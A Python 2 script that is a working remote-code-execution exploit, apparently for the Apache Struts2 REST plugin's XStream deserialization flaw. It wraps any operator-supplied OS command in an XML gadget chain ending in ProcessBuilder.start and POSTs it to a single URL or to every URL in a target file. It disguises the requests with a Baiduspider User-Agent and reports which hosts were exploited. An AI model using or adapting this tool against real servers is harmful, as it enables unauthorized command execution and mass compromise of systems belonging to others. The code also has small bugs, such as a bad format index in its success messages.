#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import requests
import argparse


def command2payload(cmd):
    command = cmd.split(" ")
    token = ""
    for word in command:
        token += "<string>"+word+"</string>"
    return token


def generate_payload(cmd):
    token = command2payload(cmd)
    payload = '''<map> 
    <entry> 
        <jdk.nashorn.internal.objects.NativeString> 
            <flags>0</flags> 
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> 
                <dataHandler> 
                    <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> 
                        <is class="javax.crypto.CipherInputStream"> 
                            <cipher class="javax.crypto.NullCipher"> 
                                <initialized>false</initialized> 
                                <opmode>0</opmode> 
                                <serviceIterator class="javax.imageio.spi.FilterIterator"> 
                                    <iter class="javax.imageio.spi.FilterIterator"> 
                                        <iter class="java.util.Collections$EmptyIterator"/> 
                                        <next class="java.lang.ProcessBuilder"> 
                                            <command>
                                                %s
                                            </command> 
                                            <redirectErrorStream>false</redirectErrorStream> 
                                        </next> 
                                    </iter> 
                                    <filter class="javax.imageio.ImageIO$ContainsFilter"> 
                                        <method> 
                                            <class>java.lang.ProcessBuilder</class> 
                                            <name>start</name> 
                                            <parameter-types/> 
                                        </method> 
                                        <name>foo</name> 
                                    </filter> 
                                    <next class="string">foo</next> 
                                </serviceIterator> 
                                <lock/> 
                            </cipher> 
                            <input class="java.lang.ProcessBuilder$NullInputStream"/> 
                            <ibuffer></ibuffer> 
                            <done>false</done> 
                            <ostart>0</ostart> 
                            <ofinish>0</ofinish> 
                            <closed>false</closed> 
                        </is> 
                        <consumed>false</consumed> 
                    </dataSource> 
                    <transferFlavors/> 
                </dataHandler> 
                <dataLen>0</dataLen> 
            </value> 
        </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> 
    </entry> 
    <entry> 
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
    </entry> 
</map>''' % token
    return payload


def attack(target_url, cmd):
    payload = generate_payload(cmd)
    headers = {
            'Accept': '*/*',
            'Referer': 'https://www.baidu.com',
            'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
            'Content-Type': 'application/xml',
            'Cache-Control': 'no-cache',
        }
    r = requests.post(target_url, data=payload, headers=headers, timeout=30)
    if "Provider" in r.content:
        return True
    else:
        return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest="url", help="The website to exploit", type=str)
    parser.add_argument('-f', '--file', dest="fileInput", help="File include websites need to exploit", type=str)
    parser.add_argument('-c', '--command', dest="cmd", help="command need to be execute", type=str)
    args = parser.parse_args()
    
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit()

    # 从文件中读取目标列表
    if args.fileInput is not None:
        target_list = args.fileInput
        try:
            with open(target_list) as f:
                targets = f.readlines()
        except IOError, e:
            print "IOError: ", e
        
        for target in targets:
            try:
                result = attack(target, args.cmd)
                if result is True:
                    print "Exploit {1} successfully!".format(target)
                else:
                    print "Failed to exploit {1}!".format(target)
            except:
                continue
    
    else:
        # 指定目标
        result = attack(args.url, args.cmd)
        if result is True:
            print "Exploit %s successfully!" % args.url
        else:
            print "Failed to exploit %s !" % args.url